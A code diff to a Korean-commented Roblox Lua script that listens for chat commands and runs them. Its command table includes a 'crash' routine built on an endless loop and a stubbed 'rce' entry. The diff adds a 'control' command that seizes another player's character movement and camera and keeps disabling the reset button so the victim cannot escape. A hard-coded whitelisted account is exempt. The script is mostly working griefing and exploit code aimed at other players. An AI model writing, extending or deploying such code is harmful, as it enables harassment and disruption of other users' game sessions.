@@ -1,8 +1,139 @@
 local TextChatService = game:GetService("TextChatService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+
 local Whitelist = { "jdurieivfbd12" }
 
+-- 제어 상태 변수
+local controlling = false
+local controlledTarget = nil
+local inputConnections = {}
+local renderConnection = nil
+
+-- 화이트리스트 확인
+local function isWhitelisted(playerName)
+    for _, name in ipairs(Whitelist) do
+        if name:lower() == playerName:lower() then
+            return true
+        end
+    end
+    return false
+end
+
+-- 플레이어 이름으로 찾기
+local function FindMatch(Name)
+    Name = Name:lower()
+    for _, Player in Players:GetPlayers() do
+        if Player.Name:lower():sub(1, #Name) == Name then
+            return Player
+        end
+    end
+    return nil
+end
+
+-- 조종 해제 함수
+local function stopControl()
+    controlling = false
+    controlledTarget = nil
+
+    -- 카메라 복구
+    if LocalPlayer.Character then
+        local hum = LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
+        if hum then
+            workspace.CurrentCamera.CameraSubject = hum
+        end
+    end
+
+    -- 내 캐릭터 이동 복원
+    local myHum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
+    if myHum then
+        myHum.WalkSpeed = 16
+        myHum.JumpPower = 50
+    end
+
+    -- Reset 버튼 다시 활성화
+    pcall(function()
+        game.StarterGui:SetCore("ResetButtonCallback", true)
+    end)
+
+    -- 연결 해제
+    for _, conn in ipairs(inputConnections) do
+        conn:Disconnect()
+    end
+    inputConnections = {}
+    if renderConnection then
+        renderConnection:Disconnect()
+        renderConnection = nil
+    end
+
+    warn("조종 모드 해제됨")
+end
+
+-- 입력을 대상 캐릭터에 전달
+local function controlTarget(target)
+    local hum = target.Character and target.Character:FindFirstChildWhichIsA("Humanoid")
+    if not hum then return end
+
+    -- 내 캐릭터 멈춤
+    local myHum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
+    if myHum then
+        myHum.WalkSpeed = 0
+        myHum.JumpPower = 0
+    end
+
+    -- 대상 Reset 막기
+    task.spawn(function()
+        repeat
+            task.wait()
+            pcall(function()
+                game.StarterGui:SetCore("ResetButtonCallback", false)
+            end)
+        until not controlling
+    end)
+
+    -- 카메라를 대상에 붙임
+    workspace.CurrentCamera.CameraSubject = hum
+
+    -- 입력 훅킹
+    local jumping = false
+
+    table.insert(inputConnections, UserInputService.InputBegan:Connect(function(input, processed)
+        if not controlling then return end
+        if input.KeyCode == Enum.KeyCode.Space then
+            jumping = true
+        elseif input.KeyCode == Enum.KeyCode.C then
+            stopControl() -- C키로 조종 해제
+        end
+    end))
+
+    table.insert(inputConnections, UserInputService.InputEnded:Connect(function(input, processed)
+        if not controlling then return end
+        if input.KeyCode == Enum.KeyCode.Space then
+            jumping = false
+        end
+    end))
+
+    renderConnection = RunService.RenderStepped:Connect(function()
+        if not controlling then return end
+        if hum then
+            hum:Move(
+                Vector3.new(
+                    UserInputService:IsKeyDown(Enum.KeyCode.D) and 1 or UserInputService:IsKeyDown(Enum.KeyCode.A) and -1 or 0,
+                    0,
+                    UserInputService:IsKeyDown(Enum.KeyCode.S) and 1 or UserInputService:IsKeyDown(Enum.KeyCode.W) and -1 or 0
+                ),
+                true
+            )
+            if jumping then
+                hum.Jump = true
+            end
+        end
+    end)
+end
+
+-- 명령어 테이블
 local cmds = {
     ["crash"] = function()
         while true do
@@ -36,27 +167,23 @@ local cmds = {
     ["rce"] = function(_, code)
         warn("RCE 명령은 현재 지원되지 않습니다.")
     end,
+
+    ["조종"] = function(Admin, TargetName)
+        if not TargetName then return end
+        if isWhitelisted(LocalPlayer.Name) then return end -- 화이트리스트는 금지
+        if Admin == LocalPlayer then -- 스크립트 실행한 사람만 가능
+            local target = FindMatch(TargetName)
+            if target and target ~= LocalPlayer then
+                controlledTarget = target
+                controlling = true
+                controlTarget(target)
+                warn("조종 모드 시작: " .. target.Name)
+            end
+        end
+    end,
 }
 
-local function isWhitelisted(playerName)
-    for _, name in ipairs(Whitelist) do
-        if name:lower() == playerName:lower() then
-            return true
-        end
-    end
-    return false
-end
-
-local function FindMatch(Name)
-    Name = Name:lower()
-    for _, Player in Players:GetPlayers() do
-        if Player.Name:lower():sub(1, #Name) == Name then
-            return Player
-        end
-    end
-    return nil
-end
-
+-- 채팅 감지
 TextChatService.OnIncomingMessage = function(message)
     local sender = message.TextSource
     if not sender then return end
